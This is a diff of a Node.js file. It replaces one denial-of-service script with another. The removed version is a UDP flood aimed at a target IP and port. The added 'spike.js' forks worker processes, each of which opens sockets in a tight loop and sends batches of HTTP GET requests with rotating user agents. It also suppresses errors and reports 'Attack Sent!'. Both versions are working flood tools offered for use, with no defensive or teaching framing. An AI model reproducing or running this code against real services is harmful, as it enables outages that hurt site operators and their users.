@@ -1,61 +1,64 @@
-const dgram = require('dgram');
-const ping = require('ping');
-const process = require('process');
+const fs = require('fs');
+const url = require('url');
+const net = require('net');
+const cluster = require('cluster');
 
-// Command-line arguments validation
-if (process.argv.length !== 5) {
-    console.log("Usage: node udpFlood.js <target-ip> <port> <duration>");
+if (process.argv.length <= 4) {
+    console.log("node spike.js <url> <threads> <time> <port>");
     process.exit(-1);
 }
 
-const targetIP = process.argv[2]; // Target IP address
-const targetPort = process.argv[3]; // Target port
-const duration = parseInt(process.argv[4]); // Duration of the attack in seconds
+var target = process.argv[2];
+var parsed = url.parse(target);
+var host = parsed.host;
+var threads = process.argv[3];
+var time = process.argv[4];
+var port = process.argv[5]; // Port ditambahkan sebagai parameter
 
-const message = Buffer.from('A'.repeat(6224)); // 1KB message for each UDP packet
+require('events').EventEmitter.defaultMaxListeners = 0;
+process.setMaxListeners(0);
 
-let attackInterval; // Reference to interval for clearing later
+process.on('uncaughtException', function (e) { });
+process.on('unhandledRejection', function (e) { });
 
-// Function to initiate the UDP flood attack
-function udpFlood() {
-    const client = dgram.createSocket('udp4');
-    
-    attackInterval = setInterval(() => {
-        // Send UDP packet to target IP and port
-        client.send(message, 0, message.length, targetPort, targetIP, (err) => {
-            if (err) {
-                console.error('Error sending packet:', err);
-            }
-        });
-    }, 0); // Send packets every 10ms
+let userAgents = [];
+
+try {
+    userAgents = fs.readFileSync('ua.txt', 'utf8').split('\n');
+} catch (err) {
+    console.error('\x1b[31mDSTAT Kurang file ua.txt blok\n' + err);
+    process.exit(-1);
 }
 
-// Function to ping the target and stop the attack if a response is received
-function pingKill() {
-    const pingInterval = setInterval(() => {
-        ping.sys.probe(targetIP, function(isAlive) {
-            if (isAlive) {
-                console.log(`Ping response received from ${targetIP}. Stopping the UDP flood attack.`);
-                clearInterval(attackInterval);
-                clearInterval(pingInterval);
-                process.exit(0); // Exit the process after receiving the ping response
-            } else {
-                console.log(`No ping response from ${targetIP}. Continuing attack...`);
-            }
-        });
-    }, 0); // Ping every 5 seconds
+if (cluster.isMaster) {
+    for (let i = 0; i < threads; i++) {
+        cluster.fork();
+    }
+    console.clear();
+    console.log(`\x1b[33m(\x1b[33m!\x1b[37m) \x1b[33mAttack Sent!.`);
+    console.log(`\x1b[31mDSTAT SPIKE DANDIER`);
+    setTimeout(() => {
+        process.exit(1);
+    }, time * 1000);
+} else {
+    startflood();
 }
 
-// Start the UDP Flood and Ping Kill
-udpFlood();
-pingKill();
+function startflood() {
+    var int = setInterval(() => {
+        var s = new net.Socket();
+        s.connect(port, host); // Port digunakan sesuai parameter
+        s.setTimeout(10000);
+        for (var i = 0; i < 64; i++) {
+            s.write('GET ' + target + ' HTTP/1.1\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nUser-Agent: ' + userAgents[Math.floor(Math.random() * userAgents.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
+        }
+        s.on('data', function () {
+            setTimeout(function () {
+                s.destroy();
+                return delete s;
+            }, 5000);
+        });
+    });
 
-// Log status
-console.log(`\x1b[33m[\x1b[33m!\x1b[37m]\x1b[33m Starting UDP flood to ${targetIP}:${targetPort} for ${duration} seconds.`);
-
-// Stop the flood after the specified duration
-setTimeout(() => {
-    console.log('\x1b[31m[!] Flood attack finished due to time limit!');
-    clearInterval(attackInterval); // Stop the attack
-    process.exit(0); // Exit after attack duration
-}, duration * 1000); // Stop after the specified duration in seconds
+    setTimeout(() => clearInterval(int), time * 1000);
+                    }
